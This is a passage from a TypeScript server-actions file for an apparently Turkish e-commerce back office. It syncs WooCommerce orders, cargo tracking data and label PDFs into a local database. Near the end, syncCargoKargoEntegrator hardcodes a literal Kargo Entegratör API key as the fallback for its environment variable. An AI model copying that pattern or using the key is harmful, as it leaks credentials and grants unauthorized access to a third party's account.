                        'TR16': 'BURSA', 'TR17': 'ÇANAKKALE', 'TR18': 'ÇANKIRI', 'TR19': 'ÇORUM', 'TR20': 'DENİZLİ',
                        'TR21': 'DİYARBAKIR', 'TR22': 'EDİRNE', 'TR23': 'ELAZIĞ', 'TR24': 'ERZİNCAN', 'TR25': 'ERZURUM',
                        'TR26': 'ESKİŞEHİR', 'TR27': 'GAZİANTEP', 'TR28': 'GİRESUN', 'TR29': 'GÜMÜŞHANE', 'TR30': 'HAKKARİ',
                        'TR31': 'HATAY', 'TR32': 'ISPARTA', 'TR33': 'MERSİN', 'TR34': 'İSTANBUL', 'TR35': 'İZMİR',
                        'TR36': 'KARS', 'TR37': 'KASTAMONU', 'TR38': 'KAYSERİ', 'TR39': 'KIRKLARELİ', 'TR40': 'KIRŞEHİR',
                        'TR41': 'KOCAELİ', 'TR42': 'KONYA', 'TR43': 'KÜTAHYA', 'TR44': 'MALATYA', 'TR45': 'MANİSA',
                        'TR46': 'KAHRAMANMARAŞ', 'TR47': 'MARDİN', 'TR48': 'MUĞLA', 'TR49': 'MUŞ', 'TR50': 'NEVŞEHİR',
                        'TR51': 'NİĞDE', 'TR52': 'ORDU', 'TR53': 'RİZE', 'TR54': 'SAKARYA', 'TR55': 'SAMSUN',
                        'TR56': 'SİİRT', 'TR57': 'SİNOP', 'TR58': 'SİVAS', 'TR59': 'TEKİRDAĞ', 'TR60': 'TOKAT',
                        'TR61': 'TRABZON', 'TR62': 'TUNCELİ', 'TR63': 'ŞANLIURFA', 'TR64': 'UŞAK', 'TR65': 'VAN',
                        'TR66': 'YOZGAT', 'TR67': 'ZONGULDAK', 'TR68': 'AKSARAY', 'TR69': 'BAYBURT', 'TR70': 'KARAMAN',
                        'TR71': 'KIRIKKALE', 'TR72': 'BATMAN', 'TR73': 'ŞIRNAK', 'TR74': 'BARTIN', 'TR75': 'ARDAHAN',
                        'TR76': 'IĞDIR', 'TR77': 'YALOVA', 'TR78': 'KARABÜK', 'TR79': 'KİLİS', 'TR80': 'OSMANİYE',
                        'TR81': 'DÜZCE'
                    };
                    return cities[code] || code;
                }

                let city = wcOrder.billing.city
                if (wcOrder.billing.state) {
                    const stateName = getCityName(wcOrder.billing.state).toLocaleUpperCase('tr-TR');
                    // Avoid duplication if user wrote "İzmir" in city field
                    if (city && !city.toLocaleUpperCase('tr-TR').includes(stateName)) {
                        city = `${city} / ${stateName}`;
                    } else if (!city) {
                        city = stateName;
                    }
                }

                const existingOrder = await db.order.findUnique({
                    where: { barcode: `WC-${wcOrder.id}` }
                })

                // PRESERVE HISTORY
                let currentOrderId: number;
                let previousStatus = "";

                if (existingOrder) {
                    previousStatus = existingOrder.status;
                    // No need to backup history, we are updating the record so relations persist!

                    // UPDATE existing order (Preserve ID)
                    logs.push(`Order ${wcOrder.id}: Updating existing record.`)

                    // Cargo Integrator Data
                    const cargoBarcodeMeta = wcOrder.meta_data?.find((m: any) => m.key === '_gcargo_barcode_exposed')
                    const cargoTrackingMeta = wcOrder.meta_data?.find((m: any) => m.key === '_gcargo_tracking_exposed')

                    // SMART STATUS SYNC
                    // If WC Status is 'completed' or 'cancelled', we force update.
                    // If Local Status is already advanced (e.g., 'printed', 'cutting'), and WC is just 'processing', we PRESERVE local status.

                    let finalStatus = status; // Incoming WC status (mapped to 'pending' usually)

                    if (existingOrder.status !== 'pending' && existingOrder.status !== 'completed' && status === 'pending') {
                        // Local has moved forward, WC is still behind. KEEP LOCAL.
                        finalStatus = existingOrder.status;
                    }

                    await db.order.update({
                        where: { id: existingOrder.id },
                        data: {
                            customer: `${wcOrder.billing.first_name || ''} ${wcOrder.billing.last_name || ''}`.trim() || 'Misafir',
                            total: `${wcOrder.total} ${wcOrder.currency_symbol}`,
                            status: finalStatus,
                            updatedAt: new Date(), // Force update
                            email: wcOrder.billing.email,
                            phone: wcOrder.billing.phone,
                            address: `${wcOrder.billing.address_1 || ''} ${wcOrder.billing.address_2 || ''}`.trim(),
                            city: city,
                            note: wcOrder.customer_note,
                            cargoBarcode: cargoBarcodeMeta ? cargoBarcodeMeta.value : null,
                            cargoTrackingNumber: cargoTrackingMeta ? cargoTrackingMeta.value : null,
                            items: {
                                deleteMany: {}, // Clear old items (safer than trying to sync diffs)
                                create: items   // Add new/updated items
                            }
                        }
                    })
                    currentOrderId = existingOrder.id;
                } else {
                    // Create New Order
                    const cargoBarcodeMeta = wcOrder.meta_data?.find((m: any) => m.key === '_gcargo_barcode_exposed')
                    const cargoTrackingMeta = wcOrder.meta_data?.find((m: any) => m.key === '_gcargo_tracking_exposed')

                    const newOrder = await db.order.create({
                        data: {
                            customer: `${wcOrder.billing.first_name || ''} ${wcOrder.billing.last_name || ''}`.trim() || 'Misafir',
                            total: `${wcOrder.total} ${wcOrder.currency_symbol}`,
                            status: status,
                            date: new Date(wcOrder.date_created),
                            updatedAt: new Date(wcOrder.date_modified),
                            barcode: `WC-${wcOrder.id}`,
                            email: wcOrder.billing.email,
                            phone: wcOrder.billing.phone,
                            address: `${wcOrder.billing.address_1 || ''} ${wcOrder.billing.address_2 || ''}`.trim(),
                            city: city,
                            note: wcOrder.customer_note,
                            labels: JSON.stringify(['WooCommerce']),
                            hasNotification: true,
                            cargoBarcode: cargoBarcodeMeta ? cargoBarcodeMeta.value : null,
                            cargoTrackingNumber: cargoTrackingMeta ? cargoTrackingMeta.value : null,
                            items: {
                                create: items
                            }
                        }
                    })
                    currentOrderId = newOrder.id;
                }

                // ADD "COMPLETED" LOG if applicable
                if (status === 'Tamamlandı' && previousStatus !== 'Tamamlandı') {
                    await db.orderActivity.create({
                        data: {
                            orderId: currentOrderId,
                            author: 'Sistem',
                            action: 'STATUS_CHANGE',
                            details: 'Müşteriye teslim edildi (WooCommerce)',
                        }
                    })
                }

                newCount++
                logs.push(`Order ${wcOrder.id}: Synced successfully.`)

            } catch (innerError: any) {
                console.error(`Error processing WC Order ${wcOrder.id}:`, innerError)
                logs.push(`Order ${wcOrder.id}: ERROR - ${innerError.message}`)
            }
        }


        // Call Cargo Sync (Fire and Forget or Await?)
        // Better to await to ensure log consistency, but catch errors to not block WC sync
        try {
            await syncCargoKargoEntegrator();
            logs.push("Cargo Info Synced.");
        } catch (e) {
            console.error("Cargo Sync Failed:", e);
        }

        revalidatePath("/")
        return { success: true, message: `${newCount} sipariş işlendi. (Sistem v4.0 - Temiz Kurulum)`, logs: logs }

    } catch (e: any) {
        console.error(e)
        return { error: `Senkronizasyon hatası: ${e.message}` }
    }
}



export async function createManualOrder(orderData: any) {
    const { items, customer, phone, email, address, city, note, status } = orderData

    // Use a manual barcode prefix
    const barcode = `MANUAL-${Date.now()}`

    try {
        await db.order.create({
            data: {
                customer,
                phone,
                email,
                address,
                city,
                note,
                total: "0.00 ₺", // Default or user provided? For now 0 or hidden
                status: status || "pending",
                barcode,
                labels: JSON.stringify(['Manuel']),
                hasNotification: true,
                items: {
                    create: items
                }
            }
        })

        // Log activity
        const newOrder = await db.order.findUnique({ where: { barcode } })
        if (newOrder) {
            await logManualActivity(newOrder.id, "ORDER_CREATED", "Manuel sipariş oluşturuldu.")
        }

    } catch (error) {
        console.error("Failed to create manual order:", error)
        throw new Error("Sipariş oluşturulamadı.")
    }
}

export async function inspectLatestWooCommerceOrder(specificOrderId?: string) {
    const settings = await getSystemSettings()
    if (!settings.wc_url || !settings.wc_key || !settings.wc_secret) {
        return { error: "WooCommerce ayarları eksik!" }
    }

    try {
        const WooCommerce = new WooCommerceRestApi({
            url: settings.wc_url,
            consumerKey: settings.wc_key,
            consumerSecret: settings.wc_secret,
            version: "wc/v3"
        })

        // If ID specific
        if (specificOrderId) {
            const response = await WooCommerce.get(`orders/${specificOrderId}`, { context: 'edit' })
            if (response.data) {
                return {
                    success: true,
                    data: JSON.stringify(response.data, null, 2)
                }
            }
        }

        // Default get latest
        const response = await WooCommerce.get("orders", {
            per_page: 1,
            context: 'edit'
        })
        if (response.data && response.data.length > 0) {
            return {
                success: true,
                data: JSON.stringify(response.data[0], null, 2)
            }
        }

        return { error: "Hiç sipariş bulunamadı." }

    } catch (e: any) {
        console.error("Inspect Error:", e)
        return { error: `API Hatası: ${e.message}` }
    }
}

export async function inspectLatestWebhook() {
    try {
        const setting = await db.systemSetting.findUnique({
            where: { key: 'last_cargo_webhook' }
        })

        if (!setting) {
            return { error: "Henüz hiç webhook verisi gelmemiş." }
        }

        return { success: true, data: setting.value }
    } catch (e: any) {
        return { error: e.message }
    }
}

export async function checkPdfAccess() {
    const settings = await getSystemSettings()
    if (!settings.wc_url || !settings.wc_key || !settings.wc_secret) {
        return { error: "Ayarlar eksik." }
    }

    // 1. Get Latest Order to find ID and Key
    const inspect = await inspectLatestWooCommerceOrder()
    if (!inspect.success || typeof inspect.data !== 'string') {
        return { error: "Sipariş bulunamadı, test yapılamıyor." }
    }

    const order = JSON.parse(inspect.data)
    const orderId = order.id
    const orderKey = order.order_key

    // 2. Construct URL
    // Standard WPO PDF URL
    const pdfUrl = `${settings.wc_url}/wp-admin/admin-ajax.php?action=generate_wpo_wcpdf&template_type=packing-slip&order_ids=${orderId}&order_key=${orderKey}`

    try {
        // 3. Fetch with Basic Auth
        const authHeader = `Basic ${btoa(`${settings.wc_key}:${settings.wc_secret}`)}`

        const response = await fetch(pdfUrl, {
            headers: {
                'Authorization': authHeader
            }
        })

        if (response.ok && response.headers.get("content-type")?.includes("pdf")) {
            return { success: true, message: "PDF erişimi başarılı! (Proxy ile çekilebilir)", url: pdfUrl }
        } else {
            const text = await response.text()
            return { error: `PDF çekilemedi. HTTP ${response.status}. Yanıt başı: ${text.substring(0, 100)}` }
        }

    } catch (e: any) {
        return { error: `Fetch Hatası: ${e.message}` }
    }
}

// CARGO LABEL ACTIONS
export async function uploadCargoLabel(orderId: number, base64Data: string) {
    try {
        await db.order.update({
            where: { id: orderId },
            data: { cargoLabelPdf: base64Data } as any
        })
        revalidatePath("/")
        return { success: true, message: "Kargo etiketi yüklendi" }
    } catch (error) {
        console.error("Upload Error:", error)
        return { error: "Dosya yüklenirken hata oluştu" }
    }
}

export async function deleteCargoLabel(orderId: number) {
    try {
        await db.order.update({
            where: { id: orderId },
            data: { cargoLabelPdf: null }
        })
        revalidatePath("/")
        return { success: true, message: "Kargo etiketi silindi" }
    } catch (error) {
        console.error("Delete Error:", error)
        return { error: "Dosya silinirken hata oluştu" }
    }
}

export async function syncCargoKargoEntegrator() {
    const apiKey = process.env.KARGO_ENTEGRATOR_API_KEY || "OylOoz2vKllZtByiBAbl65NpdsnaNPVlpVTRzgNte8e42427";
    let updatedCount = 0;

    // API limits to 15 per page. We need to fetch multiple pages to cover recent 100 orders.
    const MAX_PAGES = 7; // 7 * 15 = 105 items

    try {
        for (let page = 1; page <= MAX_PAGES; page++) {
            const res = await fetch(`https://app.kargoentegrator.com/api/shipments?per_page=100&page=${page}`, {
                headers: {
                    'Authorization': `Bearer ${apiKey}`,
                    'Accept': 'application/json'
                },
                cache: 'no-store'
            });

            if (!res.ok) {
                console.error(`Cargo API Error (Page ${page}):`, res.status);
                // If one page fails, maybe stop? Or continue? Let's stop to be safe.
                if (page === 1) return { error: "Kargo API Hatası: " + res.status };
                break;
            }

            const json = await res.json();
            const shipments = json.data || [];

            if (shipments.length === 0) break; // End of list

            for (const ship of shipments) {
                if (!ship.platform_id) continue;

                const platformId = String(ship.platform_id);
                const barcode = ship.barcode;
                const trackingNum = ship.tracking_number;

                // Construct Print URL (Corrected via User Feedback)
                const printUrl = `https://app.kargoentegrator.com/print-pdf?shipments[0]=${ship.id}`;

                if (!trackingNum && !barcode && !ship.status) continue;

                // Try matching by Barcode (WC-123 or just 123)
                let targetBarcode = `WC-${platformId}`;

                // First try strict match by WC- prefix
                let order = await db.order.findUnique({ where: { barcode: targetBarcode } });

                // If not found, try raw ID
                if (!order) {
                    order = await db.order.findUnique({ where: { barcode: platformId } });
                }

                if (order) {
                    // Only update if something is missing or changed
                    // To avoid DB spam, check if we actually have new info
                    if (order.cargoTrackingNumber !== trackingNum || order.cargoBarcode !== barcode || order.cargoLabelPdf !== printUrl) {
                        await db.order.update({
                            where: { id: order.id },
                            data: {
                                cargoTrackingNumber: trackingNum || undefined,
                                cargoBarcode: barcode || undefined,
                                cargoLabelPdf: printUrl
                            }
                        });
                        updatedCount++;
                    }
                }
            }
        }

        revalidatePath("/");
        return { success: true, message: `${updatedCount} siparişin kargo bilgisi güncellendi.` };

    } catch (error: any) {
        console.error("Kargo Sync Error:", error);
        return { error: "Kargo Entegrasyonu Hatası: " + error.message };
    }
}
